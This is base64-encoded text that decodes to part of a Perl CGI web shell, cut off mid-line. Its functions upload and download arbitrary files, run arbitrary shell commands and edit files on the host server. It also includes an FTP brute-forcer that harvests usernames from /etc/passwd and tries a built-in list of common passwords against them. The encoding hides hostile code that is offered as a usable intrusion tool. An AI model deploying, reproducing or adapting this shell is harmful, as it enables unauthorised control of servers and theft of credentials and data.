LS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbXkgJHJlc3VsdCA9ICIiOw0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCQlleGl0KDEpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCXJldHVybiAmUHJpbnRGaWxlVXBsb2FkRm9ybTsNCg0KCX0NCglteSAkcmVzdWx0PSIiOw0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJJHJlc3VsdCAuPSAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQkkcmVzdWx0IC49ICJGYWlsZWQ6ICQhPGJyPiI7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCg0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCXJldHVybiAmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCSRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKCRDdXJyZW50RGlyKTsNCglteSAkcmVzdWx0PSIiOw0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvbXAoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBydW4gY29tbWFuZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJ1bkNtZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJfQ0KCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCgl7DQoJCSR8PTE7DQoJCSRDb21tYW5kIC49ICIgfCI7DQoJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQoJCXsNCgkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOw0KCQl9DQoJCSR8PTA7DQoJfQ0KCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KCXsNCgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygkQ29tbWFuZCk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsNCglteSAkZmlsZT0mdHJpbSgkUnVuQ29tbWFuZCk7DQoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgPic7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFJ1bkNvbW1hbmQ7DQoJbXkgJGRpcj0iPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJndWkiKS4iPC9zcGFuPiI7DQoJaWYoLXcgJEZpbGUpDQoJew0KCQkkcm93cz0iMjMiDQoJfWVsc2UNCgl7DQoJCSRtc2c9Ijxicj48Zm9udCBzdHlsZT0nY29sb3I6IHllbGxvdzsnID4gQ2Fubid0IHdyaXRlIGZpbGUhPGZvbnQ+PGJyPiI7DQoJCSRyb3dzPSIyMCINCgl9DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCSRSdW5Db21tYW5kID0gImVkaXQgJFJ1bkNvbW1hbmQiOw0KCSRyZXN1bHQgLj0gIDw8RU5EOw0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCgkkUHJvbXB0DQoJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIj4NCgk8aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJGZpbGUiID4gJHNhdmUgPGJyPiAkbXNnDQoJPGJyPjx0ZXh0YXJlYSBpZD0iZGF0YSIgbmFtZT0iZGF0YSIgY29scz0iJGNvbHMiIHJvd3M9IiRyb3dzIiBzcGVsbGNoZWNrPSJmYWxzZSI+DQpFTkQNCg0KCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJkZpbGVPcGVuKCRGaWxlLDApKTsNCgkkcmVzdWx0IC49ICI8L3RleHRhcmVhPiI7DQoJJHJlc3VsdCAuPSAiPC9mb3JtPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZpbGUgT3Blbg0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIEZpbGVPcGVuKCQpew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJbXkgJGJpbmFyeSA9IHNoaWZ0Ow0KCW15ICRyZXN1bHQgPSAiIjsNCglteSAkbiA9ICIiOw0KCWlmKC1mICRmaWxlKXsNCgkJaWYob3BlbihGSUxFLCRmaWxlKSl7DQoJCQlpZigkYmluYXJ5KXsNCgkJCQliaW5tb2RlIEZJTEU7DQoJCQl9DQoJCQl3aGlsZSAoKCRuID0gcmVhZCBGSUxFLCAkZGF0YSwgMTAyNCkgIT0gMCkgew0KCQkJCSRyZXN1bHQgLj0gJGRhdGE7DQoJCQl9DQoJCQljbG9zZShGSUxFKTsNCgkJfQ0KCX1lbHNlDQoJew0KCQlyZXR1cm4gIk5vdCdzIGEgRmlsZSEiOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQpOb3RlOiBPbmx5IHNjYW4gZnJvbSAxIHRvIDMgdXNlciA6LVM8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCR1c2VybmFtZSBuZSAiIikNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlc